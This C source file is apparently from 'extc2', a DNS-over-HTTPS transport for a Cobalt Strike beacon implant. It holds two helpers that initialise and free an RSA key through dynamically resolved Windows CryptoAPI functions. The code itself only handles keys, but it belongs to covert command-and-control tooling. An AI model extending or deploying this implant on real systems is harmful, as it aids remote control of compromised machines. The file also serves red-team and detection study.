/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * CryptRsaInit
 *
 * Purpose:
 *
 * Creates a key object for RSA
 *
-*/
BOOL CryptRsaInit( PBEACON_INSTANCE Ins )
{
	if ( Ins->api.CryptAcquireContextA( &Ins->Prov[0], NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
	{
		if ( Ins->api.CryptImportPublicKeyInfo( Ins->Prov[0], X509_ASN_ENCODING, Ins->RsaKey, &Ins->Keys[0] ) )
		{
			return TRUE;
		};
		Ins->api.CryptReleaseContext( Ins->Prov[0], 0 );
	};
	return FALSE;
};

/*-
 *
 * CryptRsaFree
 *
 * Purpose:
 *
 * Free's the associated keys for RSA
 *
-*/
VOID CryptRsaFree( PBEACON_INSTANCE Ins )
{
	Ins->api.CryptDestroyKey( Ins->Keys[0] );
	Ins->api.CryptReleaseContext( Ins->Prov[0], 0 );
};
